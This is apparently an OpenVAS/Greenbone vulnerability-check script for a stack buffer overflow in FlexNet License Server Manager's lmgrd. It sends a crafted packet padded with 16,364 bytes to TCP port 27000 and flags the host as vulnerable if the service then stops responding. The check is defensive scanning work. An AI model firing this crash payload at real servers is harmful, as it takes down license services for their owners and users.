if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802629" );
	script_version( "$Revision: 11888 $" );
	script_bugtraq_id( 52718 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 17:27:49 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2012-05-17 16:16:16 +0530 (Thu, 17 May 2012)" );
	script_name( "FlexNet License Server Manager 'lmgrd' Component Stack BOF Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 27000 );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18877" );
	script_xref( name: "URL", value: "http://www.flexerasoftware.com/pl/13057.htm" );
	script_xref( name: "URL", value: "http://aluigi.altervista.org/adv/lmgrd_1-adv.txt" );
	script_xref( name: "URL", value: "http://www.zerodayinitiative.com/advisories/ZDI-12-052/" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute arbitrary code
  within the context of the affected application. Failed exploit attempts will
  result in a denial of service condition." );
	script_tag( name: "affected", value: "Flexera Software FlexNet License Server Manager versions 11.9.1 and prior" );
	script_tag( name: "insight", value: "The flaw is due to an error within the License Server Manager 'lmgrd'
  component when processing certain packets. This can be exploited to cause a
  stack based buffer overflow by sending specially crafted packets to TCP port
  27000." );
	script_tag( name: "solution", value: "Upgrade to FlexNet License Server Manager version 11.10 or later." );
	script_tag( name: "summary", value: "This host is running FlexNet License Server Manager and is prone to
  stack buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
port = 27000;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
req = raw_string( 0x2f, 0x24, 0x18, 0x9d, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ) + crap( data: "a", length: 16364 );
send( socket: soc, data: req );
close( soc );
sleep( 5 );
soc1 = open_sock_tcp( port );
if(!soc1){
	security_message( port );
	exit( 0 );
}
close( soc1 );

